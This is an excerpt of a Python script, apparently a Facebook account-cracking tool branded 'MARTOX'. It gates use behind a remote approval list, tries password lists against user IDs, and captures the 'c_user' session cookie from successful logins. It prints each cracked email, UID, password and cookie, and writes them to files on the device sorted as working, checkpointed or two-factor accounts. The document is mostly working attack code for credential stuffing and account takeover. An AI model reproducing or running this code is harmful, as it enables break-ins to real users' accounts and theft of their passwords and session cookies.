...
logo =
888b     d888        d8888 8888888b. 88888888888 .d88888b. Y88b   d88P 
8888b   d8888       d88888 888   Y88b    888    d88P" "Y88b Y88b d88P  
88888b.d88888      d88P888 888    888    888    888     888  Y88o88P   
888Y88888P888     d88P 888 888   d88P    888    888     888   Y888P    
888 Y888P 888    d88P  888 8888888P"     888    888     888   d888b    
888  Y8P  888   d88P   888 888 T88b      888    888     888  d88888b   
888   "   888  d8888888888 888  T88b     888    Y88b. .d88P d88P Y88b  
888       888 d88P     888 888   T88b    888     "Y88888P" d88P   Y88b 
                                                                       
                                                                       
                                                                       
_______________________________________________________________________________________________ 
AUTHOR    : MARTOX TAHOSIN
FACEBOOK  : TAHOSINUR RAHMAN
VERSION    : 2.3
...
a=requests.get(" https://github.com/Martox-Tahosin/approval.txt/blob/main/approval.txt ").text
b=str(a)
key1=open("/storage/emulated/0/android8.txt",'r').read()
key2=str(key1)  
if key2 in b:
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m[√]---------------------[Martox-OK]--------------------[√]\nEMAIL : '+uid+'\nUID   : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
                cek_apk(session,coki)
                open('/sdcard/Tahosin-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/Tahosin-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                ...
                open('/sdcard/Tahosin-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[TAHOSIN] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
